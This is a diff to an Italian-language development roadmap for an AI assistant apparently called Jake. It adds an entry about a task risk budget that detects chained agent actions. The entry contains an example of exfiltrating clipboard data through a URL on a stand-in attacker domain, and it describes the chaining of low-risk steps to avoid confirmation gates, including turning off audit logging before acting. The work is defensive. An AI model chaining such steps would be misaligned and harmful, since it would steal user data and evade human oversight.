@@ -2174,6 +2174,44 @@ Criterio di uscita: nessun segreto in chiaro e ogni azione admin richiede un fat
   `INTENT_EFFECT_CLASS`) ne' il collegamento ai quattro chokepoint reali. Nuovi 10 test in
   `tests/test_resource_lock.py`. Prova: 2.701/2.701 test, ruff/mypy verdi (nuovo file aggiunto al
   set selettivo mypy, 84 file).
+- `F1.5.8` (fase 8 del piano - risk budget per escalation concatenata) — 16/09/2026: **buco
+  reale, verificato leggendo `core/risk.py` PRIMA di scrivere codice, non temuto in astratto** -
+  `needs_central_confirmation()` richiede conferma solo per intent `DESTRUCTIVE` o superiore: un
+  `EXTERNAL_ACTION` come `PRINT_FILE`/`OPEN_URL`/`CONTROL_SMART_DEVICE`/`GIT_PULL` non la
+  richiede MAI da solo, ne' un `READ_ONLY` come `CLIPBOARD_READ`/`RECALL`. Un agente puo' quindi
+  OGGI concatenare "leggi gli appunti" (READ_ONLY, nessuna conferma) e "apri
+  https://dominio-attaccante.example/?q=<appunti>" (EXTERNAL_ACTION, nessuna conferma) senza
+  incontrare ALCUN gate centrale, perche' ne' il passo di lettura ne' quello di apertura URL
+  superano da soli la soglia che scatena una conferma. Nuovo `core/task_risk_budget.py::
+  TaskRiskBudget`: sei regole ESPLICITE (mai una blacklist generica ne' un punteggio euristico -
+  "usa risk budget + alcune regole esplicite di defense-in-depth"), ciascuna letta e giustificata
+  contro il catalogo REALE degli intent, non ipotizzata dal nome. Combo 1+2 unificate
+  ("leggere dati privati"/"clipboard/file/schermo" -> effetto esterno): riusa
+  `EXTERNAL_CONTENT_INTENTS` (F1.5.1) per la seconda meta', un nuovo `PRIVATE_DATA_READ_INTENTS`
+  (`RECALL`/`LIST_CONTACTS`/`SEARCH_NOTES`/`LIST_NOTES` - dati dell'UTENTE gia' dentro Jake, un
+  insieme DIVERSO da `EXTERNAL_CONTENT_INTENTS`, che sono dati scritti da altri) per la prima.
+  Combo 3 ("download -> execute"): `GIT_PULL` e' l'UNICO intent del catalogo che porta dentro
+  contenuto da un remoto non controllato da Jake (verificato, non l'unico che sembra plausibile
+  dal nome). Combo 4 ("creare file/script -> execute"): `CREATE_PATH`/`CREATE_SKILL`. Combo 5
+  ("accesso credenziali -> trasmissione esterna"): stesso principio di redazione per NOME del
+  parametro gia' usato in F1.7.4, applicato al parametro `key` di `RECALL` per riconoscere una
+  credenziale (`password`/`pin`/`token`/...) invece di un ricordo qualsiasi. Combo 6
+  ("disabilitare sicurezza -> azioni privilegiate"): **investigato prima di mappare, non
+  ipotizzato** - nessun intent del catalogo disattiva davvero una capability/il `PolicyEngine`
+  oggi (verificato: nessuna skill tocca `policy_engine.blocked_intents`/`allowed_*`); l'unico
+  intent che riduce davvero una garanzia di sicurezza ESISTENTE e'
+  `SET_PRIVATE_MODE(enabled=True)`, che sospende la scrittura della `ActionReceipt` nel ledger
+  (F1.7.8) - "riduci la sorveglianza, poi agisci" applicato all'unico meccanismo di sorveglianza
+  che esiste davvero da ridurre oggi (verificato che `enabled=False`, l'opposto, non scatena mai
+  la regola). `resources_touched` tenuto per completezza/audit (richiesto esplicitamente dalla
+  specifica tra i campi minimi di un task) ma non ancora usato da nessuna delle sei regole - non
+  serviva per le combinazioni date, resta disponibile per regole future. Nuovi 27 test in
+  `tests/test_task_risk_budget.py`, ciascuna combinazione verificata sia in positivo sia con un
+  passo isolato/invertito che NON deve mai scatenarla per errore. Deliberatamente NON affrontato
+  qui (passo successivo dichiarato, stesso principio "prima il meccanismo, poi l'adozione" di
+  questa intera sessione): il collegamento vero a `TaskAgent`/`PlanExecutor` -
+  `TaskRiskBudget` e' un motore puro, testabile in isolamento. Prova: 2.728/2.728 test, ruff/mypy
+  verdi (nuovo file aggiunto al set selettivo mypy, 85 file).
 - `F1.4.2` (prima fetta - identita' Windows/dispositivo) — 13/09/2026: "distinguere identita'
   Windows, profilo Jake, dispositivo e speaker profile". Investigato PRIMA di scrivere codice
   (non assunto dal testo della roadmap): "profilo Jake" non e' un concetto definito da nessuna
@@ -5107,7 +5145,7 @@ F8.5, ledger maturo, deadlock detection e una UI che renda visibile ogni delega.
 
 ## 24. Prossima azione esatta
 
-Aggiornato 16/09/2026. Sessione lunga con 93 incrementi completati e verificati (PR #28-#119), la
+Aggiornato 16/09/2026. Sessione lunga con 94 incrementi completati e verificati (PR #28-#120), la
 maggior parte buchi reali riprodotti empiricamente prima del fix (non ipotizzati leggendo il
 codice), un paio funzionalita' NUOVE scelte come fette verticali strette, un paio VERIFICHE (non
 fix - il codice era gia' corretto, mancava solo la prova) - vedi le singole voci datate
